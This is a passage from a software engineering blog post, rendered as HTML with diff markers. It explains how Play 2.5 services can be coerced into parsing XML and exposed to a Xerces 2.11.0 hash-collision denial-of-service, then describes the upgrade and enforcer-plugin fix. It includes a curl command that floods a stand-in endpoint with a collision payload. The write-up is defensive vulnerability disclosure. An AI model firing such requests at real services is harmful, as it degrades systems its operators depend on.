+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">9
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-shell" data-lang="shell">$ sbt <span style="color:#f1fa8c">&#34;whatDependsOn xerces xercesImpl 2.11.0&#34;</span>
+...
+<span style="color:#ff79c6">[</span>info<span style="color:#ff79c6">]</span> xerces:xercesImpl:2.11.0
+<span style="color:#ff79c6">[</span>info<span style="color:#ff79c6">]</span>   +-com.typesafe.play:play_2.11:2.5.13 <span style="color:#ff79c6">[</span>S<span style="color:#ff79c6">]</span>
+<span style="color:#ff79c6">[</span>info<span style="color:#ff79c6">]</span>     +-com.typesafe.play:filters-helpers_2.11:2.5.12 <span style="color:#ff79c6">[</span>S<span style="color:#ff79c6">]</span>
+<span style="color:#ff79c6">[</span>info<span style="color:#ff79c6">]</span>     +-com.typesafe.play:play-cache_2.11:2.5.13 <span style="color:#ff79c6">[</span>S<span style="color:#ff79c6">]</span>
+<span style="color:#ff79c6">[</span>info<span style="color:#ff79c6">]</span>     +-com.typesafe.play:play-logback_2.11:2.5.13 <span style="color:#ff79c6">[</span>S<span style="color:#ff79c6">]</span>
+<span style="color:#ff79c6">[</span>info<span style="color:#ff79c6">]</span>     +-com.typesafe.play:play-server_2.11:2.5.13 <span style="color:#ff79c6">[</span>S<span style="color:#ff79c6">]</span>
+<span style="color:#ff79c6">[</span>info<span style="color:#ff79c6">]</span>     +-com.typesafe.play:play-ws_2.11:2.5.13 <span style="color:#ff79c6">[</span>S<span style="color:#ff79c6">]</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>This means that something in play-2.5 is using an XML library that is vulnerable to the hash collision attack.  
+Further digging led me to <a href="https://github.com/playframework/playframework/blob/2.5.x/framework/src/play/src/main/scala/play/api/mvc/ContentTypes.scala#L609-L641">https://github.com/playframework/playframework/blob/2.5.x/framework/src/play/src/main/scala/play/api/mvc/ContentTypes.scala#L609-L641</a></p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-scala" data-lang="scala"><span style="color:#ff79c6">def</span> anyContent<span style="color:#ff79c6">(</span>maxLength<span style="color:#ff79c6">:</span> <span style="color:#8be9fd">Option</span><span style="color:#ff79c6">[</span><span style="color:#8be9fd">Long</span><span style="color:#ff79c6">])</span><span style="color:#ff79c6">:</span> <span style="color:#8be9fd">BodyParser</span><span style="color:#ff79c6">[</span><span style="color:#8be9fd">AnyContent</span><span style="color:#ff79c6">]</span> <span style="color:#ff79c6">=</span> <span style="color:#50fa7b">BodyParser</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;anyContent&#34;</span><span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span> request <span style="color:#ff79c6">=&gt;</span>
+  <span style="color:#ff79c6">import</span> play.api.libs.iteratee.Execution.Implicits.trampoline
+
+  <span style="color:#ff79c6">def</span> maxLengthOrDefault <span style="color:#ff79c6">=</span> maxLength<span style="color:#ff79c6">.</span>fold<span style="color:#ff79c6">(</span><span style="color:#50fa7b">DefaultMaxTextLength</span><span style="color:#ff79c6">)(</span><span style="color:#ff79c6">_</span><span style="color:#ff79c6">.</span>toInt<span style="color:#ff79c6">)</span>
+  <span style="color:#ff79c6">def</span> maxLengthOrDefaultLarge <span style="color:#ff79c6">=</span> maxLength<span style="color:#ff79c6">.</span>getOrElse<span style="color:#ff79c6">(</span><span style="color:#50fa7b">DefaultMaxDiskLength</span><span style="color:#ff79c6">)</span>
+  <span style="color:#ff79c6">val</span> contentType<span style="color:#ff79c6">:</span> <span style="color:#8be9fd">Option</span><span style="color:#ff79c6">[</span><span style="color:#8be9fd">String</span><span style="color:#ff79c6">]</span> <span style="color:#ff79c6">=</span> request<span style="color:#ff79c6">.</span>contentType<span style="color:#ff79c6">.</span>map<span style="color:#ff79c6">(</span><span style="color:#ff79c6">_</span><span style="color:#ff79c6">.</span>toLowerCase<span style="color:#ff79c6">(</span><span style="color:#50fa7b">Locale</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">ENGLISH</span><span style="color:#ff79c6">))</span>
+  contentType <span style="color:#ff79c6">match</span> <span style="color:#ff79c6">{</span>
+    <span style="color:#ff79c6">case</span> <span style="color:#50fa7b">Some</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;text/plain&#34;</span><span style="color:#ff79c6">)</span> <span style="color:#ff79c6">=&gt;</span>
+      logger<span style="color:#ff79c6">.</span>trace<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;Parsing AnyContent as text&#34;</span><span style="color:#ff79c6">)</span>
+      text<span style="color:#ff79c6">(</span>maxLengthOrDefault<span style="color:#ff79c6">)(</span>request<span style="color:#ff79c6">).</span>map<span style="color:#ff79c6">(</span><span style="color:#ff79c6">_</span><span style="color:#ff79c6">.</span>right<span style="color:#ff79c6">.</span>map<span style="color:#ff79c6">(</span>s <span style="color:#ff79c6">=&gt;</span> <span style="color:#50fa7b">AnyContentAsText</span><span style="color:#ff79c6">(</span>s<span style="color:#ff79c6">)))</span>
+
+    <span style="color:#ff79c6">case</span> <span style="color:#50fa7b">Some</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;text/xml&#34;</span><span style="color:#ff79c6">)</span> <span style="color:#ff79c6">|</span> <span style="color:#50fa7b">Some</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;application/xml&#34;</span><span style="color:#ff79c6">)</span> <span style="color:#ff79c6">|</span> <span style="color:#50fa7b">Some</span><span style="color:#ff79c6">(</span><span style="color:#50fa7b">ApplicationXmlMatcher</span><span style="color:#ff79c6">())</span> <span style="color:#ff79c6">=&gt;</span>
+      logger<span style="color:#ff79c6">.</span>trace<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;Parsing AnyContent as xml&#34;</span><span style="color:#ff79c6">)</span>
+      xml<span style="color:#ff79c6">(</span>maxLengthOrDefault<span style="color:#ff79c6">)(</span>request<span style="color:#ff79c6">).</span>map<span style="color:#ff79c6">(</span><span style="color:#ff79c6">_</span><span style="color:#ff79c6">.</span>right<span style="color:#ff79c6">.</span>map<span style="color:#ff79c6">(</span>x <span style="color:#ff79c6">=&gt;</span> <span style="color:#50fa7b">AnyContentAsXml</span><span style="color:#ff79c6">(</span>x<span style="color:#ff79c6">)))</span>
+
+    <span style="color:#ff79c6">case</span> <span style="color:#50fa7b">Some</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;text/json&#34;</span><span style="color:#ff79c6">)</span> <span style="color:#ff79c6">|</span> <span style="color:#50fa7b">Some</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;application/json&#34;</span><span style="color:#ff79c6">)</span> <span style="color:#ff79c6">=&gt;</span>
+      logger<span style="color:#ff79c6">.</span>trace<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;Parsing AnyContent as json&#34;</span><span style="color:#ff79c6">)</span>
+      json<span style="color:#ff79c6">(</span>maxLengthOrDefault<span style="color:#ff79c6">)(</span>request<span style="color:#ff79c6">).</span>map<span style="color:#ff79c6">(</span><span style="color:#ff79c6">_</span><span style="color:#ff79c6">.</span>right<span style="color:#ff79c6">.</span>map<span style="color:#ff79c6">(</span>j <span style="color:#ff79c6">=&gt;</span> <span style="color:#50fa7b">AnyContentAsJson</span><span style="color:#ff79c6">(</span>j<span style="color:#ff79c6">)))</span>
+
+    <span style="color:#ff79c6">case</span> <span style="color:#50fa7b">Some</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;application/x-www-form-urlencoded&#34;</span><span style="color:#ff79c6">)</span> <span style="color:#ff79c6">=&gt;</span>
+      logger<span style="color:#ff79c6">.</span>trace<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;Parsing AnyContent as urlFormEncoded&#34;</span><span style="color:#ff79c6">)</span>
+      urlFormEncoded<span style="color:#ff79c6">(</span>maxLengthOrDefault<span style="color:#ff79c6">)(</span>request<span style="color:#ff79c6">).</span>map<span style="color:#ff79c6">(</span><span style="color:#ff79c6">_</span><span style="color:#ff79c6">.</span>right<span style="color:#ff79c6">.</span>map<span style="color:#ff79c6">(</span>d <span style="color:#ff79c6">=&gt;</span> <span style="color:#50fa7b">AnyContentAsFormUrlEncoded</span><span style="color:#ff79c6">(</span>d<span style="color:#ff79c6">)))</span>
+
+    <span style="color:#ff79c6">case</span> <span style="color:#50fa7b">Some</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;multipart/form-data&#34;</span><span style="color:#ff79c6">)</span> <span style="color:#ff79c6">=&gt;</span>
+      logger<span style="color:#ff79c6">.</span>trace<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;Parsing AnyContent as multipartFormData&#34;</span><span style="color:#ff79c6">)</span>
+      multipartFormData<span style="color:#ff79c6">(</span><span style="color:#50fa7b">Multipart</span><span style="color:#ff79c6">.</span>handleFilePartAsTemporaryFile<span style="color:#ff79c6">,</span> maxLengthOrDefaultLarge<span style="color:#ff79c6">).</span>apply<span style="color:#ff79c6">(</span>request<span style="color:#ff79c6">)</span>
+        <span style="color:#ff79c6">.</span>map<span style="color:#ff79c6">(</span><span style="color:#ff79c6">_</span><span style="color:#ff79c6">.</span>right<span style="color:#ff79c6">.</span>map<span style="color:#ff79c6">(</span>m <span style="color:#ff79c6">=&gt;</span> <span style="color:#50fa7b">AnyContentAsMultipartFormData</span><span style="color:#ff79c6">(</span>m<span style="color:#ff79c6">)))</span>
+
+    <span style="color:#ff79c6">case</span> <span style="color:#ff79c6">_</span> <span style="color:#ff79c6">=&gt;</span>
+      logger<span style="color:#ff79c6">.</span>trace<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;Parsing AnyContent as raw&#34;</span><span style="color:#ff79c6">)</span>
+      raw<span style="color:#ff79c6">(</span><span style="color:#50fa7b">DefaultMaxTextLength</span><span style="color:#ff79c6">,</span> maxLengthOrDefaultLarge<span style="color:#ff79c6">)(</span>request<span style="color:#ff79c6">).</span>map<span style="color:#ff79c6">(</span><span style="color:#ff79c6">_</span><span style="color:#ff79c6">.</span>right<span style="color:#ff79c6">.</span>map<span style="color:#ff79c6">(</span>r <span style="color:#ff79c6">=&gt;</span> <span style="color:#50fa7b">AnyContentAsRaw</span><span style="color:#ff79c6">(</span>r<span style="color:#ff79c6">)))</span>
+  <span style="color:#ff79c6">}</span>
+<span style="color:#ff79c6">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>The above code is used by Play to parse any request - this means even if a Play service is not designed to accept XML,
+by passing in a content type of &ldquo;text/xml&rdquo; or &ldquo;application/xml&rdquo;, we can &ldquo;coerce&rdquo; the play service to parse the payload.  
+The only restriction is that the maximum length of content that will be parsed is DefaultMaxTextLength (which maps to
+the <code>play.http.parser.maxMemoryBuffer</code> setting).</p>
+<p>This means that I can POST XML to Play Services even if they weren&rsquo;t designed to accept XML!</p>
+<p>In my case I found a service that was configured to allow bigger POST payloads than the default of 100K:</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-text" data-lang="text">play.http.parser.maxMemoryBuffer=1536K
+</code></pre></td></tr></table>
+</div>
+</div><p>So I just fired off a small attack (having asked permission first, of course!)</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-shell" data-lang="shell">$ seq <span style="color:#bd93f9">1</span> <span style="color:#bd93f9">10</span> | xargs -n1 -P10 -I<span style="color:#ff79c6">{}</span> curl https://vulnerable.service.com/endpoint -d @test_collision.xml -H <span style="color:#f1fa8c">&#39;Content-Type: text/xml&#39;</span> -H <span style="color:#f1fa8c">&#34;X-Iteration: {}&#34;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>The above fires off 10 requests in parallel - and it wouldn&rsquo;t matter whether the requests are successful or not as
+Play is processing the XML&hellip;</p>
+<p>And the following was the CPU:</p>
+<p><img src="/images/coerced_to_make_xerces_think_stats.png" alt=""></p>
+<h1 id="the-mitigation">The mitigation</h1>
+<p>The fix was simple - I found that there is a later version of Xerces that had an implementation of SymbolTable that
+changed the hashing algorithm to something other than the standard Java hashing if too many collisions occurred:</p>
+<p>Compare:</p>
+<ul>
+<li><a href="https://svn.apache.org/repos/asf/xerces/java/tags/Xerces-J_2_11_0/src/org/apache/xerces/util/SymbolTable.java">https://svn.apache.org/repos/asf/xerces/java/tags/Xerces-J_2_11_0/src/org/apache/xerces/util/SymbolTable.java</a></li>
+<li><a href="https://svn.apache.org/repos/asf/xerces/java/tags/Xerces-J_2_12_0/src/org/apache/xerces/util/SymbolTable.java">https://svn.apache.org/repos/asf/xerces/java/tags/Xerces-J_2_12_0/src/org/apache/xerces/util/SymbolTable.java</a></li>
+</ul>
+<p>So, the fix is to ensure that you&rsquo;ve got the following dependency</p>
+<pre><code class="language-sbt" data-lang="sbt">&quot;xerces&quot; % &quot;xercesImpl&quot; % &quot;2.12.0&quot; withSources()
+</code></pre><p>or (in Maven land)</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-xml" data-lang="xml"><span style="color:#ff79c6">&lt;dependency&gt;</span>
+   <span style="color:#ff79c6">&lt;groupId&gt;</span>xerces<span style="color:#ff79c6">&lt;/groupId&gt;</span>
+   <span style="color:#ff79c6">&lt;artifactId&gt;</span>xercesImpl<span style="color:#ff79c6">&lt;/artifactId&gt;</span>
+   <span style="color:#ff79c6">&lt;version&gt;</span>2.12.0<span style="color:#ff79c6">&lt;/version&gt;</span>
+<span style="color:#ff79c6">&lt;/dependency&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Also useful is the enforcer Maven plugin to have to ensure that xerces 2.11.0 doesn&rsquo;t sneak in transitively</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-xml" data-lang="xml"><span style="color:#ff79c6">&lt;plugin&gt;</span>
+   <span style="color:#ff79c6">&lt;groupId&gt;</span>org.apache.maven.plugins<span style="color:#ff79c6">&lt;/groupId&gt;</span>
+   <span style="color:#ff79c6">&lt;artifactId&gt;</span>maven-enforcer-plugin<span style="color:#ff79c6">&lt;/artifactId&gt;</span>
+   <span style="color:#ff79c6">&lt;version&gt;</span>3.0.0-M1<span style="color:#ff79c6">&lt;/version&gt;</span>
+   <span style="color:#ff79c6">&lt;executions&gt;</span>
+      <span style="color:#ff79c6">&lt;execution&gt;</span>
+         <span style="color:#ff79c6">&lt;id&gt;</span>enforce-versions<span style="color:#ff79c6">&lt;/id&gt;</span>
+         <span style="color:#ff79c6">&lt;goals&gt;</span>
+            <span style="color:#ff79c6">&lt;goal&gt;</span>enforce<span style="color:#ff79c6">&lt;/goal&gt;</span>
+         <span style="color:#ff79c6">&lt;/goals&gt;</span>
+         <span style="color:#ff79c6">&lt;configuration&gt;</span>
+            <span style="color:#ff79c6">&lt;rules&gt;</span>
+               <span style="color:#ff79c6">&lt;bannedDependencies&gt;</span>
+                  <span style="color:#ff79c6">&lt;excludes&gt;</span>
+                     <span style="color:#ff79c6">&lt;exclude&gt;</span>xerces:xercesImpl:[,2.12.0)<span style="color:#ff79c6">&lt;/exclude&gt;</span>
+                  <span style="color:#ff79c6">&lt;/excludes&gt;</span>
+               <span style="color:#ff79c6">&lt;/bannedDependencies&gt;</span>
+            <span style="color:#ff79c6">&lt;/rules&gt;</span>
+         <span style="color:#ff79c6">&lt;/configuration&gt;</span>
+      <span style="color:#ff79c6">&lt;/execution&gt;</span>
+   <span style="color:#ff79c6">&lt;/executions&gt;</span>
+<span style="color:#ff79c6">&lt;/plugin&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><h1 id="moral-of-the-story">Moral of the Story</h1>
+<ul>
+<li>Even if you do not design your service to process XML, it may be vulnerable to XML attack vectors</li>
+<li>Do not use outdated libraries</li>
+<li>Know what dependencies you are using</li>
+<li>XML is evil</li>
+</ul>
+<ul class="pa0">
+  
+</ul>
+<div class="mt6 instapaper_ignoref">
+      
+      
+      </div>
+    </div>
+
+    <aside class="w-30-l mt6-l">
+
+
+
+
+</aside>
+
+  </article>
+
+    </main>
+    <footer class="bg-black bottom-0 w-100 pa3" role="contentinfo">
+  <div class="flex justify-between">
+  <a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://beny23.github.io/" >
+    &copy;  Tales about Software Engineering 2020 
+  </a>
+    <div>
+
+
+<a href="https://stackoverflow.com/users/227140/beny23" target="_blank" class="link-transition stackoverflow link dib z-999 pt3 pt0-l mr1" title="Stack Overflow link" rel="noopener" aria-label="follow on Stack Overflow——Opens in a new window">
+  <svg height="32px" 
+    style="enable-background:new 0 0 67 67;"
+    xmlns="http://www.w3.org/2000/svg"
+    viewBox="0 0 24 24"
+    width="32px"
+>
+    <path d="M12 0c-6.627 0-12 5.373-12 12s5.373 12 12 12 12-5.373 12-12-5.373-12-12-12zm.869 5.903l3.114 4.567-.975.665-3.115-4.567.976-.665zm-2.812 2.585l4.84 2.838-.6 1.017-4.842-2.838.602-1.017zm-1.276 2.724l5.413 1.521-.291 1.077-5.428-1.458.306-1.14zm-.588 2.461l5.687.569-.103 1.12-5.691-.513.107-1.176zm-.169 2.16h5.835v1.167h-5.835v-1.167zm7.976 3.167h-10v-6h1v5h8v-5h1v6zm.195-8.602l-.945-5.446 1.162-.202.947 5.446-1.164.202z"/>
+</svg>
+
+<span class="new-window"><svg  height="8px"  style="enable-background:new 0 0 1000 1000;" version="1.1" viewBox="0 0 1000 1000" width="8px" xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" >
+<path d="M598 128h298v298h-86v-152l-418 418-60-60 418-418h-152v-86zM810 810v-298h86v298c0 46-40 86-86 86h-596c-48 0-86-40-86-86v-596c0-46 38-86 86-86h298v86h-298v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:;"/>
+</svg>
+</span></a>
+
+
+
+
+
+
+<a href="https://www.linkedin.com/in/gerald-benischke-9811b663" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window">
+  <svg  height="32px"  style="enable-background:new 0 0 65 65;" version="1.1" viewBox="0 0 65 65" width="32px" xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+  <path d="M50.837,48.137V36.425c0-6.275-3.35-9.195-7.816-9.195  c-3.604,0-5.219,1.983-6.119,3.374V27.71h-6.79c0.09,1.917,0,20.427,0,20.427h6.79V36.729c0-0.609,0.044-1.219,0.224-1.655  c0.49-1.22,1.607-2.483,3.482-2.483c2.458,0,3.44,1.873,3.44,4.618v10.929H50.837z M22.959,24.922c2.367,0,3.842-1.57,3.842-3.531  c-0.044-2.003-1.475-3.528-3.797-3.528s-3.841,1.524-3.841,3.528c0,1.961,1.474,3.531,3.753,3.531H22.959z M34,64  C17.432,64,4,50.568,4,34C4,17.431,17.432,4,34,4s30,13.431,30,30C64,50.568,50.568,64,34,64z M26.354,48.137V27.71h-6.789v20.427  H26.354z" style="fill-rule:evenodd;clip-rule:evenodd;fill:;"/>
+</svg>
+
+<span class="new-window"><svg  height="8px"  style="enable-background:new 0 0 1000 1000;" version="1.1" viewBox="0 0 1000 1000" width="8px" xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" >
+<path d="M598 128h298v298h-86v-152l-418 418-60-60 418-418h-152v-86zM810 810v-298h86v298c0 46-40 86-86 86h-596c-48 0-86-40-86-86v-596c0-46 38-86 86-86h298v86h-298v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:;"/>
+</svg>
+</span></a>
+
+
+
+
+
+
+
+
+</div>
+  </div>
+</footer>
+
+    
+
+  <script src="/dist/js/app.3fc0f988d21662902933.js"></script>
+
+
+  </body>
+</html>
